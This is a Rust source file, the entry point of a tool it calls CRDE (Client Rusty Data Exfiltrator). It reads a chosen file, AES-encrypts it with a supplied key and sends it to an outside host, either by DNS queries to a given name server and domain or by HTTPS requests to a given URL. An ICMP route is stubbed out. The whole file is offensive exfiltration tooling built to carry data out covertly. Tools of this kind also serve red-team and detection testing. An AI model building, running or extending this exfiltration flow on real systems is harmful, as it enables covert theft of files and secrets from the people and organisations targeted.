pub mod args;
pub mod methods;
pub mod utils;

use args::*;
use env_logger::Builder;
use log::{info,trace,error};
use colored::Colorize;

use crate::utils::files::get_file_as_byte_vec;
use crate::utils::crypto::aes_encrypt;
use crate::methods::dns::dns_exfiltrator;
use crate::methods::https::https_exfiltrator;
use crate::utils::checker::{is_ipv4,is_https_url};

/// Main of CRDE (Client Rusty Data Exfiltrator)
fn main() {
    // Get args
    let common_args = extract_args();

    // Build logger
    Builder::new()
        .filter(Some("crde"), common_args.verbose)
        .filter_level(log::LevelFilter::Error)
        .init();

    // Exfiltrate datas
    match common_args.exfiltration_type {
        Type::Dns => {
            // DNS client exfiltrator
            is_ipv4(&common_args.name_server);
            info!("Exfiltration from DNS queries.");
            info!("key: {}",common_args.key.bold().green());

            // Get file content
            let file_content = get_file_as_byte_vec(&common_args.filename);
            trace!("File content as Vec<u8>: {:?}",file_content);
            //let encoded_file = xor(file_content.to_owned(), common_args.key.as_bytes().to_vec());
            //trace!("File encoded with XOR: {:?}",encoded_file);
            // AES256 encode
            let aes_encoded_file = aes_encrypt(&file_content[..], common_args.key.as_bytes());
            trace!("File encoded as AES256: {:?}",aes_encoded_file);

            dns_exfiltrator(
                aes_encoded_file,
                common_args.dns_tcp,
                &common_args.domain_name,
                &common_args.name_server, 
            );
        }
        Type::Https => {
            // HTTPS client exfiltrator
            is_https_url(&common_args.url);
            info!("Exfiltration from HTTPS queries.");
            info!("Key: {}",common_args.key.bold().green());
            
            // Get file content
            let file_content = get_file_as_byte_vec(&common_args.filename);
            trace!("File content as Vec<u8>: {:?}",file_content);
            //let encoded_file = xor(file_content.to_owned(), common_args.key.as_bytes().to_vec());
            //trace!("File encoded with XOR: {:?}",encoded_file);
            // AES256 encode
            let aes_encoded_file = aes_encrypt(&file_content[..], common_args.key.as_bytes());
            trace!("File encoded as AES256: {:?}",aes_encoded_file);

            https_exfiltrator(
                aes_encoded_file,
                &common_args.url,
            );
        }
        Type::Icmp => {
            // ICMP client exfiltrator
            info!("Exfiltration from ICMP queries. (not implemented yet)");
            info!("Key: {}",common_args.key.bold().green());
            // TODO
        }
        _ => { 
            // Unknown Type
            error!("Unknown type, please check usage --help");
        }
    }
}